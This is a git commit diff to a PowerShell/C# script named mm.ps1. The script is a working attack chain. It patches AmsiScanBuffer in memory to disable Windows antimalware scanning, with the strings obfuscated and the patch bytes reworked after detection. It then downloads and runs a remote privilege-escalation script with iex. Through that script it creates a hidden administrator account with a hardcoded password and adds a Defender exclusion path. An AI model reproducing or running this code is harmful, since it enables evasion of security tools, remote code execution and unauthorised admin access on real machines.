18cbbb3efe8fb91078029d60bd40296980ad0caa
farzas1 <eightfarzad@gmail.com>
2025-09-26 09:45:19 +0330

    Update mm.ps1

--- mm.ps1
+++ mm.ps1
@@ -1,35 +1,66 @@
-$Win32 = @"
-
 using System;
 using System.Runtime.InteropServices;
 
-public class Win32 {
+public class amsi
+{
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr LoadLibrary(string lpFileName);
 
-    [DllImport("kernel32")]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
 
-    [DllImport("kernel32")]
-    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern IntPtr GetModuleHandle(string lpModuleName);
 
-    [DllImport("kernel32")]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
+    private const uint PAGE_EXECUTE_READWRITE = 0x40;
+
+    private static string gklpoiu = "a*m*s*i.*********************dl******l*".Replace("*", "");
+    private static string msasbnc = "A**m*siS**c*a*******n*Buf*f*er".Replace("*", "");
+
+    [STAThread]
+    public static void Main()
+    {
+            IntPtr zkqru = LoadLibrary(gklpoiu);
+            IntPtr xntwkmv = GetProcAddress(zkqru, msasbnc);
+        byte[] ltrhpjt = (IntPtr.Size == 8) ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0x48, 0x8B, 0x04, 0x24, 0x48, 0x83, 0xC4, 0x08, 0xFF, 0xE0 } :
+            new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80,0x58, 0x83, 0xC4, 0x18,0xFF, 0xE0 }; //32 bit patch bytes was detected had to update it 
+
+
+
+// x64 assembly
+// mov eax, 0x80070057
+//  mov rax, [rsp]
+//  add rsp, 8
+//  jmp rax
+
+
+
+
+//x86 assembly 
+
+//mov eax, 0x80070057
+//pop eax 
+//add esp, 0x18
+//jmp eax
+
+        
+        uint pvrloq;
+            if (!VirtualProtect(xntwkmv, (UIntPtr)ltrhpjt.Length, PAGE_EXECUTE_READWRITE, out pvrloq))
+            {
+                return;
+            }
+            Marshal.Copy(ltrhpjt, 0, xntwkmv, ltrhpjt.Length);
+            VirtualProtect(xntwkmv, (UIntPtr)ltrhpjt.Length, pvrloq, out pvrloq);
+    }
 }
-"@
-
-Add-Type $Win32
-
-$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
-$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
-$p = 0
-[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
-$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
-[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
-
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/farzas1/bad/refs/heads/main/Invoke-SigmaPotato.ps1')
 Invoke-SigmaPotato -command "net user k kopq@123 /add"
 Invoke-SigmaPotato -command "net localgroup administrators k /add"
 Invoke-SigmaPotato -command "powershell Add-MpPreference -ExclusionPath C:\programdata"
+
 
 
 
